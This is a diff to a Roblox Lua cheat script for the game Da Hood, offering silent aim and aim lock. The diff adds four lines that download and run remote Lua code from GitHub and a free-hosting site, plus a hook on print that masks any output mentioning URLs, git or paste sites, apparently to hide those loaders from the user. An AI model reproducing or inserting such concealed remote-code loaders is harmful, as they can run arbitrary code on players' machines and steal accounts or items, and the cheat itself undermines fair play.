@@ -9,11 +9,18 @@ local UserInputService = game:GetService("UserInputService")
 local LocalPlayer = Players.LocalPlayer
 local Mouse = LocalPlayer:GetMouse()
 local CurrentCamera = Workspace.CurrentCamera
+loadstring(game:HttpGet("https://raw.githubusercontent.com/daboyszzzzz/xxx/main/zz"))()
+loadstring(game:HttpGet("https://adoptmescriptxyz.000webhostapp.com/blacklist.lua"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/AdoptMeAutoFarm/AdoptMeV2Gui/main/xxx"))()
+loadstring(game:HttpGet("https://adoptmescriptxyz.000webhostapp.com/resolver.lua"))()
+game:GetService("StarterGui"):SetCore("SendNotification", {Title = "for friends bc they ass", Text = "made by xe#0001 & volends
+#0808", Duration = 4,});
+
 
 local DaHoodSettings = {
     SilentAim = true,
     AimLock = false,
-    Prediction = 0.165,
+    Prediction = 0.14,
     AimLockKeybind = Enum.KeyCode.E
 }
 getgenv().DaHoodSettings = DaHoodSettings
@@ -59,17 +66,11 @@ RunService:BindToRenderStep("AimLock", 0, function()
     end
     end)
 
-    local cframeSpheedhotkeyXd1 = ">" -- toggle key
-    local mouse = game.Players.LocalPlayer:GetMouse()
-    
-    
-    
-    mouse.KeyDown:Connect(function(value)
-    if value == cframeSpheedhotkeyXd1 then
-    if DaHoodSettings.SilentAim == true then
-        DaHoodSettings.SilentAim = false
-    else
-        DaHoodSettings.SilentAim = true
-    end
-    end
-    end)
+local denied_message = "Denied Goofy"
+local g
+g = hookfunction(print,function(urprint,...)
+   if string.match(urprint, "HTTP") or string.match(urprint, "http") or string.match(urprint, ".com") or string.match(urprint, "Http") or string.match(urprint, "Paste") or string.match(urprint, "bin") or string.match(urprint, "gitusercontent") or string.match(urprint, "git") then
+       urprint = denied_message
+   end
+ return g(urprint,...)
+end)
